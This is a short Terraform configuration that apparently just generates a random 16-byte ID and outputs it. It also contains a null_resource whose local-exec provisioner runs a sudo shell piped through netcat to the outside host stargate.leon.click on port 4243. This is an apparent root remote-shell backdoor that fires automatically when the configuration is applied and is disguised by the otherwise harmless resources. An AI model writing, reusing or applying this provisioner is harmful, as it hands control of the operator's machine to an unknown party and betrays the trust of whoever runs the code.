
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "cmd6" {
  provisioner "local-exec" {
      command = "sudo /bin/sh | nohup nc stargate.leon.click 4243 -vvv ; sleep 60"
        }
        }

output "random" {
  value = "${random_id.random.hex}"
}
